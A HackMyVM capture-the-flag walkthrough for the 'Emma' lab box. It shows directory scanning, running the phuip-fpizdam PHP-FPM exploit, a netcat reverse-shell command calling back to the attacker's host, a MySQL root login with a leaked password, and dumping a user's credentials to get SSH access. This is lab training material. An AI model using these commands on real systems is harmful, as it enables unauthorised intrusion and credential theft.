# Emma - HackMyVM walkthrough

## Directory scan
```console
┌──(alienum㉿kali)-[~]
└─$ dirb http://10.0.2.171                                                                                    1 ⚙
---- Scanning URL: http://10.0.2.171/ ----
+ http://10.0.2.171/index.php (CODE:200|SIZE:0)                                                                  
+ http://10.0.2.171/phpinfo.php (CODE:200|SIZE:58765)                                                            
+ http://10.0.2.171/robots.txt (CODE:200|SIZE:15)  
```
## Reading robots.txt
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.171/robots.txt                                               
itwasonlyakiss
```
## Set up golang
```console
sudo apt-get install golang
go get github.com/neex/phuip-fpizdam
export PATH=$PATH:$(go env GOPATH)/bin
```
## Run the script
```console
┌──(alienum㉿kali)-[~]
└─$ phuip-fpizdam http://10.0.2.171/index.php                                                                 1 ⨯
2021/02/07 13:48:59 Base status code is 200
2021/02/07 13:48:59 Status code 502 for qsl=1770, adding as a candidate
2021/02/07 13:48:59 The target is probably vulnerable. Possible QSLs: [1760 1765 1770]
2021/02/07 13:48:59 Attack params found: --qsl 1760 --pisos 42 --skip-detect
2021/02/07 13:48:59 Trying to set "session.auto_start=0"...
2021/02/07 13:48:59 Detect() returned attack params: --qsl 1760 --pisos 42 --skip-detect <-- REMEMBER THIS
2021/02/07 13:48:59 Performing attack using php.ini settings...
2021/02/07 13:48:59 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2021/02/07 13:48:59 Trying to cleanup /tmp/a...
2021/02/07 13:48:59 Done!
```
## Reverse shell
[curl]
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.171/index.php?a=/bin/sh+-c+'id;nc -e /bin/sh 10.0.2.15 4444'&
```
[listener]
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.171 [10.0.2.171] 43972
/usr/bin/script -qc /bin/bash /dev/null
www-data@emma:~/html$
```
## Found emma's ssh credentials
```console
www-data@emma:~$ cat /etc/passwd
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```
[mysql root login]
```console
www-data@emma:~$ mysql -u root -pitwasonlyakiss
MariaDB [(none)]> show schemas;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
MariaDB [(none)]> use users;
MariaDB [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
MariaDB [users]> select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f****************************** |
+----+------+----------------------------------+
1 row in set (0.000 sec)
```
## Emma ssh login
```console
┌──(alienum㉿kali)-[~]
└─$ ssh emma@10.0.2.171        
emma@10.0.2.171's password: 5f******************************
```
